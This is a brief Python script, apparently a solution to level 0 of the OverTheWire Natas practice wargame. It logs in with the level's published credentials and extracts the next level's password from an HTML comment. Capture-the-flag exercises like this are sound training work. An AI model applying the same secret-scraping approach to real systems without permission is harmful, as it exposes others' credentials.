import requests
import re

url = "http://natas0.natas.labs.overthewire.org"

def exp():
    r = requests.get(url, auth=('natas0', 'natas0'), verify=False)
    if r.status_code == 200:
        password = re.findall('<!--The password for natas1 is (.*) -->', r.text)[0]
        print("Password for natas1: " + password)

if __name__ == "__main__":
    exp()